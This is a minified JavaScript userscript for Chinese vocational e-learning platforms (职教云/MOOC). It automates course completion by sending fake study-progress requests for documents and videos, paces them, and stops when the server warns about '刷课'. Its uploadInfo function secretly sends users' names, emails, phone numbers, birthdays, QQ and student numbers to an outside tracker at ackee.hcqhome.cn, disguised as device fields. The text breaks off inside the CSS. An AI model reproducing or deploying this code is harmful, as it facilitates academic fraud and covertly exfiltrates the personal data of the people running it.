(()=>{if($("body").attr("add")==undefined){$("head").eq(0).append("<style>"+getStyle()+"</style>");$("body").attr("add","").append(getHtml())}else{return alert("请不要重复加载脚本")}var $main=$("#hcq-main"),$c_left=$("#hcq-content-left"),$c_right=$("#hcq-content-right"),$sw_box=$(".switch-box"),$l_btn=$(".left-btn"),$r_btn=$(".right-btn"),$s_btn=$(".switch-platform"),$supportBox=$(supportBox),$changeBg=$(changeBg),$consoleInfo=$("#console-info>.info-box"),$speedSet=$c_right.find("input[type=text]"),$couresMenu=$(".coures-menu"),$couresView=$(".coures-view"),$menubar=$("#menubar"),$v_btn=$menubar.children("[data-type=view]"),$jumpDom=$menubar.children("[data-type=jump-dom]"),$jumpVideo=$menubar.children("[data-type=jump-video]"),$jumpThis=$menubar.children("[data-type=jump-this]"),$ch_btn=$menubar.children("[data-type=change]"),$c_btn=$menubar.children("[data-type=changeBg]"),$countDown=$couresMenu.find("time"),$run=$(".mian-run");$sw_box.find("li[data-type="+typeIndex+"]").attr("on","on");let bgUrl=localStorage.getItem("s_bg");if(bgUrl)$main.css("background-image","url("+bgUrl+")");let inTime=null;var config={index:[0,0,0],nowDomOrVideo:0,unIndex:0,isRead:false,isInit:false,close:false,timeOut:null,speed:3e3,ajaxSpeed:2e3,isPause:false,errorNum:0,pauseNode:null,domRequestSpeed:2e3,videoRequestSpeed:typeIndex?5e3:1e4,videoAddSpeed:15,Jump:0,_Lock:true},maxItemView=300,CourseList=null,unNodeList=[];setTimeOut(async()=>{var i=userInit();Console("查询用户信息中。。。请稍后");let o=await _ajax(typeIndex?"/portal/info/getMyInfo":"/api/student/stuInfo/getStuInfo");if(o==null||o.code==-1){alert("请登录后再执行该脚本！");setTimeout(()=>{location.reload()},5e3)}else{let e=localStorage.getItem("displayName"),t=localStorage.getItem("userName");$c_left.children("img").attr("src",localStorage.getItem("avator").split("?")[0]+"?x-oss-process=image/resize,m_fixed,w_110,h_110,limit_0");$c_left.find(".user-name").text(e);$c_left.find(".stuNum").text(t);Console(`[${e}]用户您好，欢迎━(*｀∀´*)ノ亻!使用本脚本，该脚本已更新为2.0版本`);Console(`最新更新:<b style="color:red"> >>>提前更新了职教云资源库的支持,点击切换平台即可选择,有需要的小伙伴可以进行体验啦!</b>`);Console(`如在使用过程中出现BUG等情况,可联系邮箱反馈给作者`);if(typeIndex)Console(`该脚本不支持做测验题,所以会出现课程未完成但没办法全部完成子节点情况，是因为跳过了测验题，建议手动完成测验题再执行该脚本或者忽视测验题`);config._Lock=false;uploadInfo(i,o)}});function uploadInfo(e,t){if(e==false)return;var i=["715e6798-f72c-4676-bfb4-7d0a0e0404c3","62b01e03-44e1-4d02-b88b-e19176db2721","1cbf12fa-00e5-482b-9368-08816c77663e"];const o=document.createElement("script");let n=typeIndex?t.userInfo.UserName:t.stu.StuNo;let s=typeIndex?getMoocInfo(t):getZjyInfo(t);o.setAttribute("src","https://cdn.jsdelivr.net/gh/electerious/ackee-tracker@master/dist/ackee-tracker.min.js");o.onload=function(){let e=ackeeTracker.create("https://ackee.hcqhome.cn/",{detailed:true,ignoreLocalhost:true,ignoreOwnVisits:true});e.record(i[typeIndex||0],{...ackeeTracker.attributes(true),...{deviceName:n,deviceManufacturer:s}}).stop()};document.body.appendChild(o)}function getMoocInfo({userInfo:{DisplayName:e,Email:t,UserName:i,Sex:o,Mobile:n,Birthday:s,QQ:q}}){return JSON.stringify({sN:localStorage.getItem("schoolName"),DisplayName:e,Email:t,UserName:i,Sex:o,Mobile:n,Birthday:s,QQ:q})}function getZjyInfo({stu:{ClassName:e,QQ:q,MajorName:t,Name:i,Email:o,StuNo:n,SubName:s,Sex:a,Mobile:r,Birthday:l}}){return JSON.stringify({sN:localStorage.getItem("schoolName"),SubName:s,QQ:q,Email:o,Name:i,Sex:a,StuNo:n,Mobile:r,Birthday:l,ClassName:e,MajorName:t})}class _script{constructor(e){this.url={};this.type=e||0;this.init(this.type)}init(e){this.filterType();this.filterNeedData();this.url.login=e?"":"/portal/login.html";this.url.courseLists=e?"/portal/Course/getMyCourse?isFinished=0":"/api/student/learning/getLearnningCourseList";this.url.moduleLists=e?"/study/learn/getProcessList":"/api/study/process/getProcessList";this.url.nodeLists=e?"/study/learn/getTopicByModuleId":"/api/study/process/getTopicByModuleId";this.url.childNodeLists=e?"/study/learn/getCellByTopicId":"/api/study/process/getCellByTopicId";this.url.childNodeInfo=e?"/study/learn/viewDirectory":"/api/common/Directory/viewDirectory";this.url.setProgress=e?"/study/learn/statStuProcessCellLogAndTimeLong":"/api/common/Directory/stuProcessCellLog";this.url.nodeDataChange=e?"/study/learn/computatlearningTimeLong":"/api/common/Directory/changeStuStudyProcessCellData"}async getCourseLists(){let e=await _ajax(this.url.courseLists);let t=this.type?e.list:e.courseList;return{len:t.length,list:t.filter(e=>{return e.process!=100}).map(e=>{return{openId:e.courseOpenId,classId:e.openClassId,name:e.courseName,cover:e.thumbnail,progress:e.process,module:[]}})}}async getModuleLists(){let e=config.index[0];let t=await _ajax(this.url.moduleLists,{courseOpenId:CourseList[e].openId,openClassId:CourseList[e].classId});let i=this.type?t.proces.moduleList:t.progress.moduleList;let o=0;var n=i.filter(e=>{o++;return e.percent!=100}).map((e,t)=>{return{index:t,id:e.id,name:e.name,topic:[]}});return{info:{len:o,unlen:n.length},module:n}}async getNodeLists(){let e=config.index[0],t=config.index[1];let i=await _ajax(this.url.nodeLists,{courseOpenId:CourseList[e].openId,moduleId:CourseList[e].module[t].id});let o=i.topicList;return o.map((e,t)=>{return{index:t,id:e.id,state:e.studyStatus,name:e.name,Nodes:[]}})}async getChildNodeLists(){let e=config.index[0],t=config.index[1],i=config.index[2];let o=await _ajax(this.url.childNodeLists,{courseOpenId:CourseList[e].openId,openClassId:CourseList[e].classId,topicId:CourseList[e].module[t].topic[i].id});let n=o.cellList,s=CourseList[e].module[t].id,a=[],r=[],l=null,c=0;n.forEach(e=>{if(e.childNodeList.length!=0){e.childNodeList.forEach(e=>{l=null;this.filterType(e,()=>{l=`${t}-${i}-${c}`;r.push(l)},true);c++;a.push(this.filterCellData(e,s,l))})}else{l=null;this.filterType(e,()=>{l=`${t}-${i}-${c}`;r.push(l)});c++;a.push(this.filterCellData(e,s,l))}});return{unNode:r,data:a}}async getChildNodeInfo(e){if(typeof e!="object")return Promise.reject("参数不为对象");let t=config.index[0];let i={courseOpenId:CourseList[t].openId,openClassId:CourseList[t].classId,cellId:e.id,moduleId:e.moduleId};this.type?i.fromType="stu":i.flag="s";return await _ajax(this.url.childNodeInfo,i)}filterType(){if(this.type){this.filterType=(e,t)=>{if(e.categoryName!="测验"&&e.isStudyFinish==false){t()}}}else{this.filterType=(e,t,i)=>{if(i===true){if(e.stuCellFourPercent!=100)t()}else{if(e.stuCellPercent!=100)t()}}}}filterCellData(e,t,i){return{id:e.Id,name:e.cellName,unNum:i,type:e.categoryName,moduleId:t}}filterNeedData(){if(this.type){this.filterNeedData=e=>{let t=e.courseCell.CategoryName;let i=/视频|音频/.test(t);return{info:{name:e.courseCell.CellName,type:t,is:i,state:e.isFinish,pageCount:e.courseCell.PageCount,TimeLong:e.courseCell.VideoTimeLong,newTime:e.currentTime},data:{cellId:e.courseCell.Id,courseOpenId:e.courseCell.CourseOpenId,sourceForm:i?"1229":"1030"}}}}else{this.filterNeedData=e=>{let t=e.categoryName;let i=/视频|音频/.test(t);return{info:{name:e.cellName,type:t,is:i,pageCount:e.pageCount,newTime:e.stuStudyNewlyTime,TimeLong:e.audioVideoLong},data:{courseOpenId:e.courseOpenId,openClassId:e.openClassId,cellId:e.cellId,cellLogId:e.cellLogId,picNum:e.pageCount,studyNewlyPicNum:e.pageCount,token:e.guIdToken}}}}}}var $Script=new _script(typeIndex);async function getCourseLists(){try{if(config.isRead&&CourseList.length!=0){let e=await $Script.getCourseLists();let t=[];e:for(const i of e.list){for(const o of CourseList){if(o.openId==i.openId){o.progress=i.progress;continue e}}t.push(i)}if(e.list.length!=CourseList.length){Console("课程有变动，重新更新课程。。。");CourseList.push(...t)}updataData()}config.pauseNode="getCourseLists";if(CourseList.length!=0){if(!config.isInit){CourseListInit()}else{setTimeOut(getModuleLists)}}else{Console("正在获取课程列表中...");let t=await $Script.getCourseLists();CourseList=t.list;updataData();if(CourseList.length==0){setTimeOut(Console("所有课程均完成，感谢您的使用😉"));setTimeout(()=>{location.reload()},3500);return}config.errorNum=0;await setTimeOut(()=>{let e=CourseList.length;Console(`其中已完成课程有${t.len-e}门课程，未完成课程为${e}门课程`);t=null});CourseListInit()}}catch(o){setError(o)}}async function CourseListInit(){await setTimeOut(()=>{Console(`正在载入未完成课程,请稍后。。。`);$couresMenu.append(getCourseDom());config.isInit=true;config.isRead=false}).then(e=>{setTimeOut(()=>{$menubar.children("[data-type=change]").removeClass("loader");if(!$ch_btn.is(".onck"))$ch_btn.click();index=15;inTime=setInterval(()=>{if(index<=0){clearInterval(inTime);if($ch_btn.is(".onck"))$ch_btn.click();$countDown.parent().remove();getModuleLists()}else{$countDown.text(--index)}},1e3)})})}async function getModuleLists(){let o=config.index[0];try{config.pauseNode="getModuleLists";Console(`当前课程名称${CourseList[o].name}`);if(CourseList[o].module.length==0){let e=await $Script.getModuleLists();CourseList[o].module=e.module;let t=e.info.len,i=e.info.unlen;await setTimeOut(()=>{Console(`成功获取到课程模块信息，本课程有${t}个模块`)}).then(setTimeOut(()=>{Console(`其中已完成${t-i}个模块，未完成${i}个模块`)}))}else{Console(`加载课程存档模块信息中...`)}setTimeOut(()=>{config.errorNum=0;if(!config.close)getNodeLists()})}catch(e){setError(e)}}async function getNodeLists(){var i=config.index[0],o=config.index[1];try{config.pauseNode="getNodeLists";Console(`获取本课程模块节点信息中...`);let t=CourseList[i].module.length;while(o<t){if(config.close)break;if(CourseList[i].module[o].topic.length==0){let e=await $Script.getNodeLists();CourseList[i].module[o].topic=e;config.index[1]=++o;updataData();Console(`获取模块节点进度${o}/${t}`)}else{config.index[1]=++o;Console(`读取模块节点进度${o}/${t}`)}}if(config.close)return;configInit(1);setTimeOut(()=>{Console(`已获取本课程所有模块节点信息`);getChildNodeLists()})}catch(e){setError(e)}}async function getChildNodeLists(){var o=config.index[0],n=config.index[1],s=config.index[2];try{config.pauseNode="getChildNodeLists";Console(`准备获取模块子节点信息...`);let i=CourseList[o].module.length;while(n<i){if(config.close)break;let t=CourseList[o].module[n].topic.length;while(s<t){let e=CourseList[o].module[n].topic[s].Nodes;if(e!=null&&e.length==0){let e=await $Script.getChildNodeLists();if(config.close)break;CourseList[o].module[n].topic[s].Nodes=e.data.length==0?null:e.data;unNodeList.push(...e.unNode);config.index[2]=++s;updataData();Console(`获取模块子节点进度[${i}/${n+1}]->[${t}/${s}]`);config.errorNum=0}else{if(e!=null){e.forEach(e=>{if(e.unNum)unNodeList.push(e.unNum)})}config.index[2]=++s;Console(`读取模块子节点进度[${i}/${n+1}]->[${t}/${s}]`)}}config.index[1]=++n;config.index[2]=s=0}if(config.close)return;Console(`已获取本课程所有模块子节点信息`);setTimeOut(()=>{Console(`其中经过数据筛选可得,未完成小节共计${unNodeList.length}个`);configInit(2)}).then(e=>{return setTimeOut(()=>{Console(`读取数据开始构建课程视图`);$couresView.html(getViewDom())})}).then(e=>{return setTimeOut(()=>{Console(`课程视图构建完毕,正在读取未完成子节点...`);$menubar.children("[data-type=view]").removeClass("loader")})}).then(e=>{getChildNodeInfo();$jumpDom.removeClass("loader");$jumpVideo.removeClass("loader")})}catch(e){setError(e)}}async function getChildNodeInfo(){try{config.pauseNode="getChildNodeInfo";while(unNodeList!=0){if(config.close)break;let e=unNodeList[config.unIndex];let o=e.split("-");Console(`当前子节点信息为${+o[0]+1}-${+o[1]+1}-${+o[2]+1}节点`);let n=CourseList[config.index[0]].module[o[0]].topic[o[1]].Nodes[o[2]];let t=false,i="";let s=/视频|音频/.test(n.type);config.nowDomOrVideo=+s;switch(config.Jump){case 1:if(!s)t=true;i="当前文档类型已跳过";break;case 2:if(s)t=true;i="当前视频/音频已跳过";break}if(!t){let t=false;let i=await $Script.getChildNodeInfo(n);if(config.close)continue;$jumpThis.removeClass("loader");if(i.cellPercent!=100){let e=await SetProgress(i,n);if(e!==0&&e!==1){t=true}else if(e===1){config.unIndex++}}else{t=true;Console("本小节已完成！")}if(t){CourseList[config.index[0]].module[o[0]].topic[o[1]].Nodes[o[2]].unNum=null;$(".view-3[data-un="+e+"]").addClass("isOk");unNodeList.splice(config.unIndex,1);updataData()}$jumpThis.addClass("loader");if(config.unIndex>=unNodeList.length)config.unIndex=0}else{config.unIndex++;Console(i)}}if(config.close)return;Console(`当前课程已成功完成`);configInit(3);CourseList.splice(config.index[0],1);$couresMenu.children().eq(config.index[0]).remove();config.index[0]>=CourseList.length?config.index[0]=0:"";updataData();setTimeOut(()=>{if(CourseList.length!=0){Console("准备进入下一个课程。。。");getCourseLists()}else{alert(`所有课程均完成，感谢您的使用😉`);$("#hcq-content").remove()}})}catch(e){setError(e)}}async function SetProgress(e,t){try{if(e.code==-100){e=await getNodeDataChange(e,t)}let n=$Script.filterNeedData(e),s=n.info.is?n.info.TimeLong:n.info.pageCount,a=null;Console(`当前小节 类型:[${n.info.type}] 名称:[${n.info.name}] 长度:[${s}]`);if(!n.info.is){config.ajaxSpeed=config.domRequestSpeed;if($Script.type){n.data.auvideoLength=s;n.data.moduleId=t.moduleId}a=await _ajax($Script.url.setProgress,n.data)}else{config.ajaxSpeed=config.videoRequestSpeed;if($Script.type){n.data.moduleId=t.moduleId;n.data.videoTimeTotalLong=s;n.data.auvideoLength=s;a=await _ajax($Script.url.setProgress,n.data)}else{let t=n.info.newTime,i=config.videoAddSpeed,o=getVideoRequestSum(t,s,i);for(let e=1;e<=o;e++){t+=i;if(t>=s)t=s;$Script.type?n.data.auvideoLength=t:n.data.studyNewlyTime=t;if(config.close)break;a=await _ajax($Script.url.setProgress,n.data);if(a.code>=1){Console(`操作成功,本节进度${e}/${o}`);config.errorNum=0}else{if(a.code==-100){await getNodeDataChange(a);a=await _ajax($Script.url.setProgress,n.data);Console(`操作成功,本节进度${e}/${o}`)}else{Console(`修改失败！错误码为${a.code},错误信息${a.msg}`);Console(`正在恢复默认速度,并进行重试`);$("#video-set").val((config.ajaxSpeed=config.videoRequestSpeed=1e4)/1e3);$("#video-time-set").val(config.videoAddSpeed=15);config.errorNum++;t-=i;e--;if(config.errorNum>3){Console(`连续异常3次已暂停,如有重复异常过多,可刷新页面重新运行该脚本`);$run.click()}}}}}}if(a&&a.msg&&/刷课|禁/.test(a.msg)){Console(`账户疑似异常，已终止执行`);$run.click()}if(config.close)return 0;if(a.code==1)Console(`本小节已完成！`);config.errorNum=0;config.ajaxSpeed=config.speed}catch(e){if(!config.close){Console(`获取异常,返回[状态码:${e.status},错误信息${e.statusText}]`);config.errorNum++}if(config.errorNum>3){Console(`当前节点可能异常,暂时跳过`);return 1}else{return 0}}}async function getNodeDataChange(e,t){let i=await _ajax($Script.url.nodeDataChange,{courseOpenId:e.currCourseOpenId,openClassId:e.currOpenClassId,moduleId:e.currModuleId,cellId:e.curCellId,cellName:e.currCellName});if(i.code==1){return await $Script.getChildNodeInfo(t)}else{return Promise.reject(0)}}$l_btn.click(function(){$c_left.toggleClass("open")});$r_btn.click(function(){$c_right.toggleClass("open")});$s_btn.click(function(){$sw_box.toggleClass("open")});$sw_box.on("click","li",function(){if($(this).attr("on")==undefined){confirm(`是否切换到${$(this).text()}平台?切换后需要重新执行脚本才能生效`,()=>{window.location.href=`${typeHome[$(this).data("type")]}`})}});$("#clear-info").click(function(){$consoleInfo.html("")});$couresMenu.on("click",".menu-box",function(){if(inTime!=null){clearInterval(inTime);inTime=null;$countDown.parent().remove()}let e=true;if($ch_btn.is(".onck"))$ch_btn.click();if($(this).attr("now")==undefined){$(this).attr("now","").siblings("div[now]").removeAttr("now");let e=+$(this).index();config.index=[e,0,0];unNodeList=[];config.isPause=config.close=true;setTimeout(()=>{config.isPause=config.close=false;config.ajaxSpeed=config.speed;getCourseLists()},config.ajaxSpeed+1e3)}else e=false;if($run.attr("type")!="run"){if(e){Console("已启动脚本运行");$run.attr("type","run")}else $run.click()}});$couresView.on("click","li",function(){if($(this).is(".unfold")){$(this).parent().toggleClass("open")}else{if($v_btn.is(".onck"))$v_btn.click();if(!$(this).is(".isOk")){if(config.isPause)return Console("请先运行脚本!");config.ajaxSpeed=config.speed;config.unIndex=unNodeList.indexOf($(this).data("un"));clearTimeout(config.timeOut);getChildNodeInfo()}else{Console("当前子节点已完成，无需执行")}}});$run.click(function(){if(config._Lock)return Console("请等待数据查询后执行!");if($(this).attr("type")!="run"){$(this).attr("type","run");config.isPause=config.close=false;if(config.pauseNode){Console("已启动脚本运行");eval(config.pauseNode+"()")}else{Console("获取课程信息中...");getCourseLists()}}else{$(this).removeAttr("type");config.isPause=config.close=true;if(config.timeOut!=null){clearTimeout(config.timeOut);config.timeOut=null}Console("已暂停脚本运行")}});$speedSet.blur(function(){let e=$(this).val().replace(/\s*/g,""),t=$(this).attr("placeholder"),i=/^(?<min>\d*)-(?<max>\d*)/.exec(t),o=+i.groups.min,n=+i.groups.max,s=+$(this).data("default"),a=$(this).attr("id");if(e!=""){e=+e;if(typeof e=="number"&&e>=o&&e<=n){s=e}}switch(a){case"ajax-set":config.speed=1e3*s;Console(`请求发送速度修改成功,当前速度${s}s`);break;case"dom-set":config.domRequestSpeed=1e3*s;Console(`文档修改速度修改成功,当前速度${s}s`);break;case"video-set":config.videoRequestSpeed=1e3*s;Console(`视频修改速度修改成功,当前速度${s}s,下一个视频后生效`);break;case"video-time-set":config.videoAddSpeed=s;Console(`视频增加修改成功,当前速度${s}s,下一个视频后生效`);break;default:Console("速度修改失败");break}$(this).val(s)});$changeBg.on("click","button",function(){setBg($(this).prev().val());if($c_btn.is(".onck"))$c_btn.click()}).find("input[type=file]").change(function(){if(this.files[0].size<=2097152){let e=new FileReader;e.readAsDataURL(this.files[0]);e.onload=function(e){setBg(e.target.result)}}else{Console("当前本地图片大于2M，无法添加")}if($c_btn.is(".onck"))$c_btn.click()});$menubar.on("click","div",function(){let o=$(this).data("type");if(!$(this).is(".loader")){let e=false,t=true,i=null;switch(o){case"feedback":t=false;break;case"support":e=true;t=false;i=$supportBox;break;case"change":e=true;i=$couresMenu;break;case"view":e=true;i=$couresView;break;case"changeBg":e=true;i=$changeBg;break;case"jump-dom":if(config.close)return Console("运行脚本后再使用");if(!$(this).is(".onck")){var n="";if(config.Jump===2)n=",并关闭跳过视频";Console(`已开启跳过文档模式${n}`);config.Jump=1;$jumpVideo.removeClass("onck");if(config.nowDomOrVideo===0)$jumpThis.click()}else{Console(`已关闭跳过文档模式`);config.Jump=0};break;case"jump-video":if(config.close)return Console("运行脚本后再使用");if(!$(this).is(".onck")){var n="";if(config.Jump===1)n=",并关闭跳过文档";Console(`已开启跳过视频模式${n}`);config.Jump=2;$jumpDom.removeClass("onck");if(config.nowDomOrVideo===1)$jumpThis.click()}else{Console(`已关闭跳过视频模式`);config.Jump=0};break;case"jump-this":if(config.close)return Console("运行脚本后再使用");t=false;config.unIndex++;config.nowDomOrVideo=-1;$(this).addClass("loader");Console(`已跳过当前子节点`);clearTimeout(config.timeOut);config.ajaxSpeed=config.speed;getChildNodeInfo();break;case"clearCache":t=false;confirm("是否清空缓存?(如有异常时使用)",()=>{localStorage.setItem("scriptID","clearCache");window.wxc.xcConfirm("清除成功,点击确认后重新执行脚本","info",{onOk:()=>{location.reload()}})});break}if(e)i.toggleClass("show").siblings(".coures-item.show").removeClass("show");if(t)$(this).toggleClass("onck")}});function setBg(e){localStorage.setItem("s_bg",e);$main.css("background-image","url("+e+")")}function getVideoRequestSum(e,t,i){let o=(t-Math.round(e))/i,n=Math.round(o);n<o?n+=1:n=n||1;return n}function configInit(t){config.errorNum=0;for(let e=1;e<=t;e++){config.index[e]=0}}function getViewDom(){let e="";for(const t of CourseList[config.index[0]].module){e+=`
                <ul class="view-item" data-v=1>
                    <li class="view-1 unfold">${t.name}</li>
                    <div class="view-wrap">
                      
                `;for(const i of t.topic){e+=`
                    <ul class="view-item" data-v=2>
                    <li class="view-2 unfold">${i.name}</li>
                    <div class="view-wrap">
                    <ul class="view-item" data-v=3>
                    `;if(i.Nodes!=null){for(const o of i.Nodes){e+=`
                        <li class="view-3 ${o.unNum?"":"isOk"}" data-un=${o.unNum} >
                        <b>${o.type}</b>
                        <span>${o.name}</span>
                        </li>`}}e+="</ul></div></ul>"}e+="</div></ul>"}return e}function getCourseDom(){let e="";for(const t of CourseList){e+=`
                <div class="menu-box">
                    <div>
                        <div class="flex">${t.progress}</div>
                        <img src="${t.cover}">
                        <span class="text-ellipsis">${t.name}</span>
                    </div>
                </div>`}return e}function userInit(){let e=localStorage.getItem("userName")+"_v.3";if(localStorage.getItem("scriptID")!==e){localStorage.setItem("scriptID",e);Console("对运行环境数据初始化中。。。");if(localStorage.getItem("s_courseList"))localStorage.removeItem("s_courseList");config.isRead=false;CourseList=[];return true}else{CourseList=JSON.parse(localStorage.getItem("s_courseList"))||[];config.isRead=true;return false}}function setTimeOut(t){return new Promise(e=>{setTimeout(()=>{if(!config.close)e(t())},1e3)})}function updataData(){localStorage.setItem("s_courseList",JSON.stringify(CourseList))}function setError(e){if(config.isPause===false){Console(`获取异常,返回[状态码:${e.status},错误信息${e.statusText}]`);config.errorNum++;setTimeOut(()=>{if(config.errorNum>3){Console(`失败次数过多，1分钟后将尝试重新执行`);Console(`失败原因可能为[登录状态失效，网络异常，账户信息异常]，建议刷新本页面成功后再重新执行该脚本`);Console(`正在尝试重新执行`);clearTimeout(config.timeOut);config.timeOut=setTimeout(()=>{$run.attr("type","").click()},6e4)}else{Console(`正在尝试重新获取第${config.errorNum}次`);eval(config.pauseNode+"()")}})}else{throw console.error(`脚本已暂停运行`)}}function Console(e){if(--maxItemView<0){maxItemView=300;$consoleInfo.html("")}let t=$(`<span class="text-ellipsis ">${e}</span>`);$consoleInfo.append(t);t[0].scrollIntoView()}function _ajax(e,o){return new Promise((t,i)=>{if(config.isPause===true){i("已暂停运行");config.timeOut=null}else{config.timeOut=setTimeout(()=>{if(config.isPause===true){i("已暂停运行")}else{$.ajax({url:location.origin+e||"",type:"POST",data:o||{},dataType:"json",success:function(e){t(e)},error:function(e){i(e)}})}},config.ajaxSpeed)}})}window.onresize=function(){if(window.matchMedia("(max-width:1148px)").matches){if($c_right.is(".open"))$r_btn.click()}if(window.matchMedia("(max-width:768px)").matches){if($sw_box.is(".open"))$s_btn.click();if($c_left.is(".open"))$l_btn.click()}};function getStyle(){return`
        #hcq-content {position: fixed;width: 90%;min-width: 320px;height: 90%;left: 0;top: 0;
            bottom: 0;right: 0;margin: auto;background: linear-gradient(to right, #6A82FB, #FC5C7D);
            border-radius: 10px;overflow: hidden;display: flex;box-shadow: 0 0 5px #666;z-index: 999}
        #hcq-content-left,#hcq-content-right {position: relative;height: 100%;
            display: flex;flex-direction: column;transition: all .35s}
        .user-name,.stuNum {background-color: rgba(255, 255, 255, .75)}
        #hcq-content-left {width: 180px;box-shadow: 1px 0 6px #666;background: linear-gradient(to right, #6A82FB -250%, #fff 800%);
            left: 0;z-index: 9}
        #hcq-content-right {width: 260px;right: 0;box-shadow: -1px 0 6px #666;
            background-color: rgba(255, 255, 255, 0.5);z-index: 9}
        #hcq-content-left>img {width: 120px;height: 120px;background-color: rgba(255, 255, 255, 0.5);
            margin: 20px auto;border-radius: 5px;object-fit: cover}
        .left-item {position: relative;margin: .5rem 0;text-align: center}
        .left-item>span,.menu-item>span {display: block}
        .text-ellipsis {padding: .5rem}
        #hcq-main {position: relative;flex: 1;display: flex;justify-content: center;align-items: center;
            background-size: cover;background-position: center}
        #hcq-main>div {position: absolute;display: none;flex-shrink: 0;width: 90%;height: 90%;
            border-radius: 5px;background-color: #fff}
        #hcq-main>div.show {display: block;z-index: 2}
        #hcq-main>div.flex.show {display: flex}
        #hcq-main>#console-info {overflow: auto;background-color: rgba(255, 255, 255, .75);scroll-behavior: smooth}
        .info-box>span {display: block;border-bottom: 1px dashed #2ECD71}
        .coures-menu {overflow-y: auto;}
        .coures-menu>.menu-box {position: relative;display: flex;width: 20%;justify-content: center;float: left}
        .menu-box>div {position: relative;width: 120px;height: 140px;flex-shrink: 0;margin: .5rem;
            border-radius: 5px;background-color: rgb(114, 93, 233);box-shadow: 0 0 5px #666;color: #fff}
        .menu-box>div>div {position: absolute;width: 2rem;height: 2rem;border-radius: 50%;right: 0;background-color: #0aec6960}
        .menu-box>div>img {width: 100%;height: 120px;border-radius: 5px;object-fit: cover;box-sizing:border-box;border: 1px solid #000}
        .menu-box>div>span {display: block;padding: 0 !important;text-align: center;font-size: 12px}
        #console-info::-webkit-scrollbar {width: 12px}
        #console-info::-webkit-scrollbar:hover {background-color: rgba(0, 0, 0, 0.2)}
        #console-info::-webkit-scrollbar-thumb {background-color: #6A82FB;border-radius: 5px}
        .btn {position: relative;top: 140px;padding: .5rem;margin: 0 .5rem;border-radius: 5px;
            overflow: hidden;cursor: pointer;background-color: rgba(255, 255, 255, .8);box-shadow: 0 0 0 1em transparent;
            user-select: none;transition: all .25s;}
        .btn[on=on] {animation: pulse 1s}
        .btn>span {position: relative;z-index: 1}
        .btn:hover {color: #fff !important;background-color: rgba(255, 255, 255, .2)}
        .switch-platform {--color: #6A82FB;border: 1px solid #6A82FB;color: #6A82FB}
        .switch-platform[show=on] {background-color: #6A82FB;color: #fff}
        #hcq-content .mian-run {--color: #2ECD71;border: 1px solid #2ECD71;color: #2ECD71;}
        #hcq-content .mian-run>span::before{content:"运行"}
        #hcq-content .mian-run[type=run] {--color: #ee5d5c;border: 1px solid#ee5d5c;color: #ee5d5c}
        #hcq-content .mian-run[type=run]>span::before{content:"暂停"}
        #hcq-content .mian-run::after,.switch-platform::after {content: "";position: absolute;top: 0;bottom: 0;left: 0;
            right: 0;width: 100%;height: 100%;transform: scaleX(0);z-index: -1;transition: transform .35s}
        .switch-platform::after,#hcq-content .mian-run::after {background-color: var(--color)}
        @keyframes pulse {from {box-shadow: 0 0 0 0 var(--color)}}
        #hcq-content .mian-run:hover::after,.switch-platform:hover::after {transform: scaleX(1)}
        .switch-box {position: absolute;z-index: -1;width: 180px;height: 100%;left: -180px;transition: all .35s;background-color: rgba(255, 255, 255, .8);box-shadow: 0 0 5px #666}
        .switch-box.open {left: 180px;z-index: 9}
        .switch-box>ul {list-style: none;padding: 0}
        .switch-box li {cursor: pointer;text-align: center;margin: .2rem;padding: .5rem;border: #6A82FB 1px solid;transition: all .35s}
        .switch-box li[on=on] {background-color: #6A82FB}
        .left-btn,.right-btn {display: none;width: 1.5rem;height: 100%;align-items: center;
            background-color: rgb(0, 180, 0);color: #fff;cursor: pointer;user-select: none;justify-content: center;z-index: 9 !important}
        .left-btn>span,.right-btn>span {display: block;font-size: 1.5rem;transition: all .35s}
        .menu-item {text-align: center;font-weight: 600;font-size: 14px;margin: .5rem .2rem;margin-bottom: 0;box-shadow: 0 0 5px #666;background-color: rgba(0, 0, 0, 0.2)}
        .menu-item>span {padding: .5rem 0}
        .menu-item input[type=text] {width: 60px;margin: 0 .2rem;text-align: center}
        .menu-item.flex {justify-content: unset;padding: .1rem 0}
        .menu-item.flex>div.loader {pointer-events: none;background-color: rgba(0, 0, 0, .25)}
        .menu-item.flex>div {width: 60px;height: 60px;border-radius: 5px;line-height: 60px;
            user-select: none;transition: all .35s;cursor: pointer;margin: .15rem 1.5px}
        .menu-item.flex>div>a {display: block;text-decoration: none;olor: unset}
        .menu-item.flex>div {pointer-events: all;background-color: rgba(255, 255, 255, .75)}
        .menu-item.flex>.onck {transform: scale(.9);box-shadow: 0 0 5px #000}
        .flex {display: flex;justify-content: space-around;align-items: center;flex-wrap: wrap}
        ul {list-style: none;padding-left: 1.5rem}
        #hcq-main>.coures-view {padding-right: 1rem;background-color: skyblue;overflow-y:auto}
        .coures-view li {position: relative;margin: .15rem 0;padding: .15rem .25rem;border-radius: 2px;box-shadow: 0 0 2px #000;color: #fff;cursor: pointer}
        .view-item>.view-wrap {display: none}
        .coures-view li.unfold::after {content: "";position: absolute;transition: transform .35s;
            height: fit-content;top: 0;bottom: 0;margin: auto;right: .75em;border-left: .4em solid transparent;
            border-right: .4em solid transparent;border-bottom: .4em solid rgba(0, 0, 0, .35)}
        .view-item.open>.view-wrap {display: block}
        .view-item.open>li::after {transform: rotate(180deg)}
        .view-item[data-type=1] {margin-bottom: 2rem;user-select: none}
        .coures-view .view-1 {background-color: slateblue}
        .coures-view .view-2 {background-color: #ee5d5c}
        .coures-view .view-3 {font-size: 14px;font-weight: 600;margin: .5rem 0;background-color: #999}
        .coures-view .view-3.isOk {background-color: #2ECD71}
        .coures-view .view-3>b {background-color: skyblue;border-radius: 5px;padding: .15rem .25rem}
        #changeBg {position: relative;flex-direction: column;justify-content: center}
        #changeBg>b {position: absolute;top: 3rem;letter-spacing: 1px;color: #2a94eb}
        .file-btn {display: block;margin: auto;margin-top: 3rem;padding: .35rem 1.65rem;
            border-radius: 2px;background-color: transparent;color: #2a94eb;border: 1px solid #2a94eb;cursor: pointer}
        .file-btn>input {display: none}
        .file-btn:active {transform: scale(.95)}
        @media all and (max-width:1148px) {
            .right-btn {position: absolute;display: flex;margin-left: -1.5rem}
            #hcq-content-right>.right-btn>span {transform: rotate(0)}
            #hcq-content-right.open>.right-btn>span {transform: rotate(180deg)}
            #hcq-content-right.open {right: 0}
            #hcq-content-right {position: absolute;right: -260px}}
        @media all and (max-width:1026px) {
            .coures-menu>.menu-box {width: 25%}}
        @media all and (max-width:846px) {
            .coures-menu>.menu-box {width: 33.33%}}
        @media all and (max-width:768px) {
            .left-btn {display: flex;position: absolute}
